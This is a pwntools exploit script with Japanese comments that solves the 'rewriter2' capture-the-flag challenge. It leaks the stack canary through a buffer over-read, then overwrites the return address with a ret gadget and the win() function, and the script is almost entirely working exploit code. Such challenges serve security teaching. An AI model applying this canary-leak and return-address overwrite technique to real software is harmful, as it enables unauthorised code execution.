import pwn

BIN_NAME = "./rewriter2"
pwn.context.binary = BIN_NAME
# log_levelを"DEBUG"に指定するとすべての入出力が表示されるため、動作確認が簡単になります
pwn.context.log_level = "DEBUG"
def solve(io):
    elf = pwn.ELF(BIN_NAME)
    addr_ret = 0x4012C1 # system関数を呼び出すためのスタックの16バイトアライメント用
    addr_win = elf.symbols["win"]
    print(f"***{hex(addr_win) = }")

    # 改行文字やNUL文字を送らないことで、カナリアを漏洩させる
    # カナリアの最下位バイトは0x00(=ASCII ARMOR)らしいので、それ含めて上書きさせる)
    BUF_SIZE = 40
    io.sendafter(b"What's your name?", b"A"*(BUF_SIZE + 1))
    io.recvuntil(b"Hello, " + b"A" * BUF_SIZE)
    line = io.recvline()
    print(f'***line: {line}')
    print(f'***line length: {len(line)}')
    print(f'***line[8]: {line[:8]}')
    print(f'***len(line[8]): {len(line[:8])}')

    canary = pwn.unpack(line[:8]) # 上書きしたカナリア最下位バイトも含む
    print(f'***canary1: {canary}')
    print(f'***canary1(hex): {hex(canary)}')
    canary &= 0xFFFFFFFFFFFFFF00
    print(f'***canary2: {canary}')
    print(f'***{hex(canary) = }')

    payload = pwn.flat(
        b"A" * BUF_SIZE,        # buf領域、なんでもいいです
        pwn.pack(canary),       # canary領域、カナリアと同一の値にすることで内容を維持
        b"A"*8,                 # saved rbp領域、なんでもいいです
        pwn.pack(addr_ret),     # saved ret addr領域、RSPの調整も兼ねてretのアドレスへ飛ばします
        pwn.pack(addr_win))     # ↑のret後に実行させるアドレス
    io.sendafter(b"How old are you?", payload)
    io.interactive()

#with pwn.remote("rewriter2.beginners.seccon.games", 9001) as io:
with pwn.process("./rewriter2") as io:
    solve(io)

command = """
b *0x401257
c
x/10gx $rsp
c
"""
# with pwn.gdb.debug(BIN_NAME, command) as io: solve(io)
# with pwn.process(BIN_NAME) as io: solve(io)
